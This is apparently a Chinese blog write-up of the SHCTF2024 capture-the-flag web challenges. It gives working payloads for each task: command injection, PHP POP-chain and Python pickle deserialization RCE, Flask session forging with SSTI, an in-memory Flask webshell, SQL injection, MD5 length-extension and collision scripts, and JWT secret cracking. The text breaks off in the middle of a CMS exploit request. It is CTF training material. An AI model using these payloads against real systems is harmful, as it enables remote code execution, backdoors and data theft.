+++
title = "SHCTF2024"
slug = "shctf2024"
description = "这是新生赛？"
date = "2024-11-12T09:41:57"
lastmod = "2024-11-12T09:41:57"
image = ""
license = ""
categories = ["赛题"]
tags = ["php", "flask", "pickle", "session", "jwt"]
+++

# 0x01 前言

这个比赛结束了，但是听说赛题质量挺高的来看看

# 0x02 question

## [Week1] 1zflask

访问`robots.txt`，拿到路由`/s3recttt`

```python
import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(__name__)

@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
 
if __name__ == '__main__':
    app.run(debug=True)
```

覆盖一下就好了

```
http://210.44.150.15:31118/api?SSHCTFF=tac /f*
```

## [Week1] MD5 Master

```php
<?php
highlight_file(__file__);

$master = "MD5 master!";

if(isset($_POST["master1"]) && isset($_POST["master2"])){
    if($master.$_POST["master1"] !== $master.$_POST["master2"] && md5($master.$_POST["master1"]) === md5($master.$_POST["master2"])){
        echo $master . "<br>";
        echo file_get_contents('/flag');
    }
}
else{
    die("master? <br>");
}
```

这里我刚开始想的是数组绕过，后面发现是进行了字符串的拼接了，那么就要使用工具了

```
https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip
```

先创建一个1.txt，里面写的是`MD5 master!`

然后拖到fastcoll里面就行

![1](QQ20241112-101252.png)

然后这里要进行编码，你进去看到的是乱码，写个php脚本

```php
<?php 
function readmyfile($path){
 $fh = fopen($path, "rb");
 $data = fread($fh, filesize($path));
 fclose($fh);
 return $data;
}
$a = urlencode(readmyfile("E:/CTFtools/fastcoll_v1.0.0.5.exe/1_msg1.txt"));
$b = urlencode(readmyfile("E:/CTFtools/fastcoll_v1.0.0.5.exe/1_msg2.txt"));
if(md5((string)urldecode($a))===md5((string)urldecode($b))){
echo $a."\n";
}
if(urldecode($a)!=urldecode($b)){
echo $b;
}
```

python脚本也可以

```python
import urllib.parse
def read_my_file(path):
    with open(path, 'rb') as fh:
        data = fh.read()
    return data
# 指定文件路径
file_path = "E:/CTFtools/fastcoll_v1.0.0.5.exe/1_msg1.txt"
encoded_data = urllib.parse.quote(read_my_file(file_path))
print(f"URL 编码后的内容: {encoded_data}")
```

然后看包，记得传参别把`MD5 master!`给带进去

```
POST / HTTP/1.1
Host: 210.44.150.15:22437
Content-Length: 981
Pragma: no-cache
Cache-Control: no-cache
Origin: http://210.44.150.15:22437
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://210.44.150.15:22437/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%004%AEF%04%AA%24%D7Q%86I%1C%BD3%0A%80%E7%0D%80%AE2q%5D%E1%C7%0FR%81%02%91%80%AA%17%04%F1%C3%08l%C5%29A%EB%BF%C5%01%DA%AD%9FT%02%09x%B5%F6%99T%15e%8D+i%5Ex%10D%A2%2CN1%E4%BD%9A%FC%C32-p%12%2BE%F7%23%E2E%28%60%1E%02%2A%AB%B3%10p%0A%60h%B7%D7%93%24%08%AF%85%3C%FE5%FC%03%5B%02%F8%F0P%0CM%17%CB%E6%E8%F4%EA%F0%AD%23%EE%A1%8D%F5%2B&master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%004%AEF%04%AA%24%D7Q%86I%1C%BD3%0A%80%E7%0D%80%AE%B2q%5D%E1%C7%0FR%81%02%91%80%AA%17%04%F1%C3%08l%C5%29A%EB%BF%C5%01%DA-%A0T%02%09x%B5%F6%99T%15e%8D+%E9%5Ex%10D%A2%2CN1%E4%BD%9A%FC%C32-p%12%2BE%F7%23%E2E%A8%60%1E%02%2A%AB%B3%10p%0A%60h%B7%D7%93%24%08%AF%85%3C%FE5%FC%03%5B%02x%F0P%0CM%17%CB%E6%E8%F4%EA%F0%AD%23n%A1%8D%F5%2B
```

## [Week1] ez_gittt

扫了git这里我们恢复一下

```
githacker --url http://210.44.150.15:42004/.git/ --output-folder './test'
```

这里虽然报错了但是关系不大

```
┌──(kali㉿kali)-[~/桌面/CTFtools/GitHack/test/b74541aa5150b5b34acf61a698006455]
└─$ git log --reflog
commit 9d4c235010628695d9acbc80e72f84d3b2176609 (HEAD -> master, origin/master, origin/HEAD)
Author: Rxuxin <l0vey0u1314@gmail.com>
Date:   Tue Nov 12 02:26:56 2024 +0000

    Remove_flag

commit b79ccaf837384de36b1ce34383cf7e07084cebfa
Author: Rxuxin <l0vey0u1314@gmail.com>
Date:   Tue Nov 12 02:26:55 2024 +0000

    Add_flag

commit 8dd1651ac6dc576566720781e603a606d9cea330
Author: Rxuxin <l0vey0u1314@gmail.com>
Date:   Fri Sep 20 16:17:05 2024 +0800

    __init__
┌──(kali㉿kali)-[~/桌面/CTFtools/GitHack/test/b74541aa5150b5b34acf61a698006455]
└─$ git reset --hard b79ccaf837384de36b1ce34383cf7e07084cebfa                                                                                              
HEAD 现在位于 b79ccaf Add_flag
  
┌──(kali㉿kali)-[~/桌面/CTFtools/GitHack/test/b74541aa5150b5b34acf61a698006455]
└─$ git log --oneline 
9d4c235 (HEAD -> master, origin/master, origin/HEAD) Remove_flag
b79ccaf Add_flag
8dd1651 __init__
```

```
git show b79ccaf
```

## [Week1] jvav

直接用runtime就可以了

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class  demo {
    public static void main(String[] args) {
        try {
            // 执行命令
            String command = "ls"; // 替换为你要执行的实际命令
            Process process = Runtime.getRuntime().exec(command);

            // 获取命令执行的输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();

            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            // 打印输出结果
            System.out.println("Command output:\n" + output.toString());

            // 等待命令执行完成
            int exitCode = process.waitFor();
            System.out.println("Exit code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```

## [Week1] poppopop

```php
<?php
class SH {

    public static $Web = false;
    public static $SHCTF = false;
}
class C {
    public $p;

    public function flag()
    {
        ($this->p)();
    }
}
class T{

    public $n;
    public function __destruct()
    {

        SH::$Web = true;
        echo $this->n;
    }
}
class F {
    public $o;
    public function __toString()
    {
        SH::$SHCTF = true;
        $this->o->flag();
        return "其实。。。。,";
    }
}
class SHCTF {
    public $isyou;
    public $flag;
    public function __invoke()
    {
        if (SH::$Web) {

            ($this->isyou)($this->flag);
            echo "小丑竟是我自己呜呜呜~";
        } else {
            echo "小丑别看了!";
        }
    }
}
if (isset($_GET['data'])) {
    highlight_file(__FILE__);
    unserialize(base64_decode($_GET['data']));
} else {
    highlight_file(__FILE__);
    echo "小丑离我远点！！！";
} 小丑离我远点！！！
```

```
T::destruct->F::toString->C::flag->SHCTF::invoke
```

```php
<?php
class SH {

    public static $Web = false;
    public static $SHCTF = false;
}
class C {
    public $p;
}
class T{
    public $n;
}
class F {
    public $o;
}
class SHCTF {
    public $isyou;
    public $flag;
}
$a=new T();
$a->n=new F();
$a->n->o=new C();
$a->n->o->p=new SHCTF();
$a->n->o->p->isyou="system";
$a->n->o->p->flag="tac /f*";
echo base64_encode(serialize($a));
```

## [Week1] 单身十八年的手速

直接查看`game.js`，直接解码就可以了

## [Week1] 蛐蛐?蛐蛐!

进来我看到路径有问题，以为是目录穿越，没想到是命令执行，然后试了好久说只成功了第一步，回去一看原来有源码

```php
<?php
if($_GET['ququ'] == 114514 && strrev($_GET['ququ']) != 415411){
    if($_POST['ququ']!=null){
        $eval_param = $_POST['ququ'];
        if(strncmp($eval_param,'ququk1',6)===0){
            eval($_POST['ququ']);
        }else{
            echo("鍙互璁ゝault鐨勮洂铔愬彉鎴愮幇瀹炰箞\n");
        }
    }
    echo("铔愯洂鎴愬姛绗竴姝ワ紒\n");

}
else{
    echo("鍛滃憸鍛渇ault杩樻槸瑕佸嚭棰�");
}
```

然后就不用说了吧

```
http://210.44.150.15:44144/check.php?ququ=0114514
POST:
ququ=ququk1;system("tac /f*");
```

## [Week2]MD5 GOD!

```python
from flask import *
import hashlib, os, random


app = Flask(__name__)
app.config["SECRET_KEY"] = "Th1s_is_5ecr3t_k3y"
salt = os.urandom(16)

def md5(data):
    return hashlib.md5(data).hexdigest().encode()

def check_sign(sign, username, msg, salt):
    if sign == md5(salt + msg + username):
        return True
    return False


def getRandom(str_length=16):
    """
    生成一个指定长度的随机字符串
    """
    random_str =''
    base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length =len(base_str) -1
    for i in range(str_length):
        random_str +=base_str[random.randint(0, length)]
    return random_str

users = {}
sign_users = {}

@app.route("/")
def index():
    if session.get('sign') == None or session.get('username') == None or session.get('msg') == None:
        return redirect("/login")
    sign = session.get('sign')
    username = session.get('username')
    msg = session.get('msg')
    if check_sign(sign, username, msg, salt):
        sign_users[username.decode()] = 1
        return "签到成功"
    return redirect("/login")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get('username')
        password = request.form.get('password')
        # print(password)
        if username in users and users[username] == password:
            session["username"] = username.encode()
            session["msg"] = md5(salt + password.encode())
            session["sign"] = md5(salt + md5(salt + password.encode()) + username.encode())
            return "登陆成功"
        else:
            return "登陆失败"
    else:
        return render_template("login.html")


@app.route("/users")
def user():
    return json.dumps(sign_users)


@app.route("/flag")
def flag():
    for user in users:
        if sign_users[user] != 1:
            return "flag{杂鱼~}"
    return open('/flag', 'r').read()


def init():
    global users, sign_users
    for _ in range(64):
        username = getRandom(8)
        pwd = getRandom(16)
        users[username] = pwd
        sign_users[username] = 0
    users["student"] = "student"
    sign_users["student"] = 0

init()
```

生成随机字符串来进行md5比较，这里应该只有MD5拓展攻击可以解决了吧，但是脚本emm，官方的

```python
import hashlib
import math
from typing import Any, Dict, List

rotate_amounts = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
                  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]

constants = [int(abs(math.sin(i + 1)) * 2 ** 32) & 0xFFFFFFFF for i in range(64)]

functions = 16 * [lambda b, c, d: (b & c) | (~b & d)] + \
            16 * [lambda b, c, d: (d & b) | (~d & c)] + \
            16 * [lambda b, c, d: b ^ c ^ d] + \
            16 * [lambda b, c, d: c ^ (b | ~d)]

index_functions = 16 * [lambda i: i] + \
                  16 * [lambda i: (5 * i + 1) % 16] + \
                  16 * [lambda i: (3 * i + 5) % 16] + \
                  16 * [lambda i: (7 * i) % 16]


def get_init_values(A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> List[int]:
    return [A, B, C, D]


def left_rotate(x, amount):
    x &= 0xFFFFFFFF
    return ((x << amount) | (x >> (32 - amount))) & 0xFFFFFFFF


def padding_message(msg: bytes) -> bytes:
    """
    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。
    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。
    填充的方法如下：
        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。
        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。
    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。
    """
    orig_len_in_bits = (8 * len(msg)) & 0xffffffffffffffff
    msg += bytes([0x80])
    while len(msg) % 64 != 56:
        msg += bytes([0x00])
    msg += orig_len_in_bits.to_bytes(8, byteorder='little')
    return msg


def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> int:
    message = padding_message(message)
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder='little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))


def md5_to_hex(digest: int) -> str:
    raw = digest.to_bytes(16, byteorder='little')
    return '{:032x}'.format(int.from_bytes(raw, byteorder='big'))


def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> str:
    return md5_to_hex(md5(message, A, B, C, D))


def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe,
               D: int = 0x10325476) -> int:
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder='little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))


def get_init_values_from_hash_str(real_hash: str) -> List[int]:
    """

    Args:
        real_hash: 真实的hash结算结果

    Returns: 哈希初始化值[A, B, C, D]

    """
    str_list: List[str] = [real_hash[i * 8:(i + 1) * 8] for i in range(4)]
    # 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字
    return [int.from_bytes(int('0x' + s, 16).to_bytes(4, byteorder='little'), byteorder='big') for s in str_list]


def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: str, append_data: bytes) -> Dict[str, Any]:
    """

    Args:
        origin_msg: 原始的消息字节流
        key_len: 原始密钥（盐）的长度
        real_hash: 计算出的真实的hash值
        append_data: 需要添加的攻击数据

    Returns: 发起攻击需要的物料信息
        {
            'attack_fake_msg': bytes([...]),
            'attack_hash_value': str(a1b2c3d4...)
        }

    """
    init_values = get_init_values_from_hash_str(real_hash)
    # print(['{:08x}'.format(x) for x in init_values])
    # 只知道key的长度，不知道key的具体内容时，任意填充key的内容
    fake_key: bytes = bytes([0xff for _ in range(key_len)])
    # 计算出加了append_data后的真实填充数据
    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)
    # 攻击者提前计算添加了攻击数据的哈希
    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[len(padding_message(fake_key + origin_msg)):],
                                              A=init_values[0],
                                              B=init_values[1],
                                              C=init_values[2],
                                              D=init_values[3]))
    fake_padding_data = padding_message(fake_key + origin_msg)[len(fake_key + origin_msg):]
    attack_fake_msg = origin_msg + fake_padding_data + append_data
    return {'attack_fake_msg': attack_fake_msg, 'attack_hash_value': attack_hash_value}



from flask.sessions import SecureCookieSessionInterface
import requests, json, time

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key


def session_decode(session_cookie_value, secret_key):
    """ Decode a Flask cookie  """
    app = MockApp(secret_key)
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.loads(session_cookie_value)


def session_encode(session_cookie_structure, secret_key):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)
        # session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)
        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)


def req_index(url, cookie):
    # headers = {"Cookie": "session=" + cookie}
    cookies = {"session":cookie}
    r = requests.get(url, cookies=cookies).text
    # print(r)
    if '签到成功' not in r:
        # print(cookie)
        time.sleep(1)
        req_index(url, cookie)
        # print(r)

def req_user(url):
    return json.loads(requests.get(url).text)

def req_login(url):
    data = {"username":"student", "password":"student"}
    cookie = requests.post(url, data).headers["Set-Cookie"][8:].split(';')[0]
    # print(cookie)
    return cookie

def hash_Attack(md5_value, key_len, data, attack_data):
    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)
    # print(data)
    res = {"username":attack_data, "msg":attack_materials['attack_fake_msg'][:-len(attack_data)], "sign":attack_materials['attack_hash_value'].encode()}
    return res


if __name__ == '__main__':
    url = "http://210.44.150.15:40205/"
    cookie = req_login(url+'login')
    users = req_user(url+'users')
    secret_key = "Th1s_is_5ecr3t_k3y"
    res = session_decode(cookie, secret_key)
    for user in users:
        if users[user] == 0:
            res = hash_Attack(res["sign"], 16, res["msg"]+res["username"], user.encode())
            res2 = session_encode(res, secret_key)
            # time.sleep(1)
            r = req_index(url, res2)
```

## [Week2]dickle

```python
from flask import Flask, request
import pickle
import base64
import io

BLACKLISTED_CLASSES = [
    'subprocess.check_output', 'builtins.eval', 'builtins.exec',
    'os.system', 'os.popen', 'os.popen2', 'os.popen3', 'os.popen4',
    'pickle.load', 'pickle.loads', 'cPickle.load', 'cPickle.loads',
    'subprocess.call', 'subprocess.check_call', 'subprocess.Popen',
    'commands.getstatusoutput', 'commands.getoutput', 'commands.getstatus',
    'pty.spawn', 'posixfile.open', 'posixfile.fileopen',
    '__import__', 'os.spawn*', 'sh.Command', 'imp.load_module', 'builtins.compile'
                                                                'eval', 'builtins.execfile', 'compile', 'builtins.open',
    'builtins.file', 'os.system',
    'os.fdopen', 'os.tmpfile', 'os.fchmod', 'os.fchown', 'os.open', 'os.openpty', 'os.read', 'os.pipe',
    'os.chdir', 'os.fchdir', 'os.chroot', 'os.chmod', 'os.chown', 'os.link', 'os.lchown', 'os.listdir',
    'os.lstat', 'os.mkfifo', 'os.mknod', 'os.access', 'os.mkdir', 'os.makedirs', 'os.readlink', 'os.remove',
    'os.removedirs', 'os.rename', 'os.renames', 'os.rmdir', 'os.tempnam', 'os.tmpnam', 'os.unlink', 'os.walk',
    'os.execl', 'os.execle', 'os.execlp', 'os.execv', 'os.execve', 'os.dup', 'os.dup2', 'os.execvp', 'os.execvpe',
    'os.fork', 'os.forkpty', 'os.kill', 'os.spawnl', 'os.spawnle', 'os.spawnlp', 'os.spawnlpe', 'os.spawnv',
    'os.spawnve', 'os.spawnvp', 'os.spawnvpe', 'pickle.load', 'pickle.loads', 'cPickle.load', 'cPickle.loads',
    'subprocess.call', 'subprocess.check_call', 'subprocess.check_output', 'subprocess.Popen',
    'commands.getstatusoutput', 'commands.getoutput', 'commands.getstatus', 'glob.glob',
    'linecache.getline', 'shutil.copyfileobj', 'shutil.copyfile', 'shutil.copy', 'shutil.copy2', 'shutil.move',
    'shutil.make_archive', 'popen2.popen2', 'popen2.popen3', 'popen2.popen4', 'timeit.timeit', 'sys.call_tracing',
    'code.interact', 'code.compile_command', 'codeop.compile_command', 'pty.spawn', 'posixfile.open',
    'posixfile.fileopen'
]


class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if f"{module}.{name}" in BLACKLISTED_CLASSES:
            raise pickle.UnpicklingError("Forbidden class: %s.%s" % (module, name))
        return super().find_class(module, name)


app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        encoded_data = request.form["data"]
        decoded_data = base64.b64decode(encoded_data)

        try:
            data_stream = io.BytesIO(decoded_data)
            unpickler = SafeUnpickler(data_stream)
            result = unpickler.load()
            return f"Deserialized data: {list(result)}"
        except Exception as e:
            return f"Error during deserialization: {str(e)}"
    else:
        return """
        <form method="post">
            <label for="data">Enter your serialized data:</label><br>
            <textarea id="data" name="data"></textarea><br>
            <input type="submit" value="Submit">
        </form>
        """


if __name__ == "__main__":
    app.run(port=8080)

```

可以看到是一个pickle反序列化，但是过滤的很多，可以用`subprocess.getoutput`来处理

```python
import pickle
import subprocess
import base64

class A:
    def __reduce__(self):
        return (subprocess.getoutput,("tac /f*",))

poc=pickle.dumps(A())
payload=base64.b64encode(poc).decode()
print(payload)
```

```python
data = ['S', 'H', 'C', 'T', 'F', '{', 'D', '1', '_', 'D', 'i', '5', 'C', '0', '_', '0', 'H', '_', 'D', 'I', 'C', 'k', 'L', 'E', '_', '1', 'd', '2', 'c', '1', '5', 'a', '7', '7', '4', 'e', 'f', '}']

# 将列表转换为字符串
result = ''.join(data)

# 输出结果
print(result)
```

## [Week2]guess_the_number

看源码得到路由

```python
import flask
import random
from flask import Flask, request, render_template, send_file

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html', first_num=first_num)


@app.route('/s0urce')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)


@app.route('/first')
def get_first_number():
    return str(first_num)


@app.route('/guess')
def verify_seed():
    num = request.args.get('num')
    if num == str(second_num):
        with open("/flag", "r") as file:
            return file.read()
    return "nonono"


def init():
    global seed, first_num, second_num
    seed = random.randint(1000000, 9999999)
    random.seed(seed)
    first_num = random.randint(1000000000, 9999999999)
    second_num = random.randint(1000000000, 9999999999)


init()
app.run(debug=True)
```

这里拿到源码，也没想到什么随机数啥的，那就只能爆破了

```python
import requests
import random

first_num = 3862952728

def find_flag():
    for seed in range(1000000, 10000000):  # 包括9999999
        random.seed(seed)
        G_first_num = random.randint(1000000000, 9999999999)
        if G_first_num == first_num:
            second_num = random.randint(1000000000, 9999999999)
            url = "http://210.44.150.15:20191/guess?num={}".format(second_num)
            r = requests.get(url)

            print(r.text)
            if 'nonono' not in r.text:
                print("Flag found:", r.text)
                break

if __name__ == "__main__":
    find_flag()
```

## [Week2]入侵者禁入

```python
from flask import Flask, session, request, render_template_string

app = Flask(__name__)
app.secret_key = '0day_joker'

@app.route('/')
def index():
    session['role'] = {
        'is_admin': 0,
        'flag': 'your_flag_here'
    }
    with open(__file__, 'r') as file:
        code = file.read()
    return code

@app.route('/admin')
def admin_handler():
    try:
        role = session.get('role')
        if not isinstance(role, dict):
            raise Exception
    except Exception:
        return 'Without you, you are an intruder!'

    if role.get('is_admin') == 1:
        flag = role.get('flag
```

貌似是伪造session

```
flask-unsign --decode --cookie 'eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZzLS7g.HwKYlHoZ7f4Uvlq3Rrgrm34bxgA' --secret '0day_joker'


flask-unsign --sign --cookie "{'role': {'flag': 'your_flag_here', 'is_admin': 1}}" --secret '0day_joker'
```

但是好像是拿到了一个假的flag，难道session里面注入？

试试

```
flask-unsign --sign --cookie "{'role': {'flag': '{{7+7}}', 'is_admin': 1}}" --secret '0day_joker'
```

![1](QQ20241112-120954.png)

```
flask-unsign --sign --cookie "{'role': {'flag': '{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}', 'is_admin': 1}}" --secret '0day_joker'
```

这样子写不行？，转义我也转了但是发现转不明白，那算了，直接换工具

```
TEMPLATE="{\"role\":{\"flag\":\"{% print(url_for.__globals__[\\'__builtins__\\'][\\'eval\\'](\\\"__import__(\\\\\\'os\\\\\\').popen(\\\\\\'cat \\/flag\\\\\\').read()\\\")) %}\",\"is_admin\":1}}" && python3 flask_session_cookie_manager3.py encode -s '0day_joker' -t "${TEMPLATE}"
```

这个是橘子的payload，并且我发现只有Linux里面才可以用，那我自己写的话

```
python3 flask_session_cookie_manager3.py encode -s '0day_joker' -t "{'role': {'flag': '{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}', 'is_admin': 1}}"
```

然后一直报错，后来发现

> 你提供的命令中使用了单引号 `'` 来定义 JSON 字符串，这在 Python 中是不被允许的。JSON 语法要求使用双引号 `"` 来包裹键和值。你需要将 JSON 字符串中的单引号改为双引号

那让人机改了一下发现就可以l

```
python3 flask_session_cookie_manager3.py encode -s '0day_joker' -t "{\"role\": {\"flag\": \"{{config.__class__.__init__.__globals__['os'].popen('tac /f*').read()}}\", \"is_admin\": 1}}"
```

那难道用flask-unsign就不行了？真是不明白这个点

## [Week2]登录验证

一个jwt的题目，爆破密钥先(题目提示是6位)

```
npm install --global jwt-cracker
```

```
jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ --max 6

./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzEzOTQzODEsImlhdCI6MTczMTM4NzE4MSwibmJmIjoxNzMxMzg3MTgxLCJyb2xlIjoidXNlciJ9.aNfQHMw4DT28eDOfkVm03ZifKx5D5l34M6kaBbB0GhA
```

![1](QQ20241112-131835.png)





换了就好了

## [Week2]自助查询

![1](QQ20241112-134100.png)

裸奔？

```
1") union select 1,2--
```

然后正常注入就可以了

```sql
1") union select (select group_concat(schema_name) from information_schema.schemata),2--

1") union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2--

1") union select (select group_concat(column_name) from information_schema.columns where table_name='flag'),2--

1") union select (select group_concat(scretdata) from flag),2--
```

说是在注释里面，原来还有这种东西

```
1") union select (select group_concat(column_comment) from information_schema.columns where table_name='flag'),2--
```

## [Week3] hacked_website

先扫一下

```
dirsearch -u http://210.44.150.15:32713/
```

登录等会应该是要爆破的，不过我们可以看看文章里面有没有东西

![1](QQ20241112-135301.png)

D盾直接就扫出来了，那么这里是`admin/profile.php`，这里面传参只有`POST['SH']`

那么现在就是爆破之后访问就行

![1](QQ20241112-141950.png)

![1](QQ20241112-142049.png)

## [Week3] love_flask

```python
from flask import Flask, request, render_template_string
# Flask 2.0.1
# Werkzeug 2.2.2
app = Flask(__name__)
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pretty Input Box</title>
<style>
  .pretty-input {
    width: 100%;
    padding: 10px 20px;
    margin: 20px 0;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 25px;
    box-sizing: border-box;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
    transition: border 0.3s ease-in-out;
  }

  .pretty-input:focus {
    border-color: #4CAF50;
    outline: none;
  }

  .submit-button {
    width: 100%;
    padding: 10px 20px;
    margin: 20px 0;
    font-size: 16px;
    color: white;
    background-color: #4CAF50;
    border: none;
    border-radius: 25px;
    cursor: pointer;
  }

  .container {
    max-width: 300px;
    margin: auto;
    text-align: center;
  }
</style>
</head>
<body>

<div class="container">
  <form action="/namelist" method="get">
    <input type="text" class="pretty-input" name="name" placeholder="Enter your name...">
    <input type="submit" class="submit-button" value="Submit">
  </form>
</div>

</body>
</html>
'''

@app.route('/')
def pretty_input():
    return render_template_string(html_template)

@app.route('/namelist', methods=['GET'])
def name_list():
    name = request.args.get('name')  
    template = '<h1>Hi, %s.</h1>' % name
    rendered_string =  render_template_string(template)
    if rendered_string:
        return 'Success Write your name to database'
    else:
        return 'Error'

if __name__ == '__main__':
    app.run(port=8080)

```

无回显只渲染，打内存马

```
{{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}

http://210.44.150.15:42024/namelist?cmd=tac /f*
```

## [Week3] 小小cms

[YzmCMS官方网站](https://www.yzmcms.com/)，找找CVE

最后找到了

```
POST /pay/index/pay_callback.html HTTP/1.1
Host: 210.44.150.15:36497
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
